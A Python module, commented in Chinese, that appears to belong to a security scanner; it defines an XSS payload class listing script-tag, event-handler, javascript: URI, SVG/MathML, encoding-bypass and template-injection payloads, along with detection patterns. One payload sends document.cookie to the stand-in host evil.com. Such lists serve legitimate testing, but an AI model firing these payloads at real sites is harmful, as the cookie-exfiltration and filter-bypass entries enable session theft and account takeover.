"""
XSS（跨站脚本）攻击载荷。

职责：生成反射型 / 存储型 / DOM 型 XSS 载荷。
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional

from .base import Payload


class XSSPayload(Payload):
    """
    XSS 跨站脚本攻击载荷。

    覆盖：
    - 经典 <script> 标签注入
    - 事件处理器注入（onerror / onload）
    - javascript: 协议注入
    - SVG / MathML 注入
    - 模板注入
    """

    @property
    def name(self) -> str:
        return "xss"

    @property
    def severity(self) -> str:
        return "high"

    def generate(self, params: Optional[Dict[str, Any]] = None) -> List[str]:
        """生成 XSS 载荷列表。"""
        return [
            # 经典 script 标签
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",

            # 事件处理器
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.cookie)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<svg onload=alert(1)>",
            "<marquee onstart=alert(1)>",

            # 协议注入
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "data:text/html,<script>alert(1)</script>",

            # SVG / MathML
            "<svg><animate onbegin=alert(1) attributeName=x>",
            "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d='M0'><svg/onload=alert(1)>",

            # 大小写混淆
            "<ScRiPt>alert(1)</ScRiPt>",
            "<IMG SRC=x ONERROR=alert(1)>",

            # 编码绕过
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",

            # 模板注入
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "#{alert(1)}",
        ]

    def get_detection_patterns(self) -> List[str]:
        """XSS 检测特征模式。"""
        return [
            "<script>",
            "</script>",
            "onerror=",
            "onload=",
            "onfocus=",
            "onstart=",
            "javascript:",
            "alert(",
            "document.cookie",
            "document.location",
            "<svg",
            "<img src=x",
            "data:text/html",
        ]
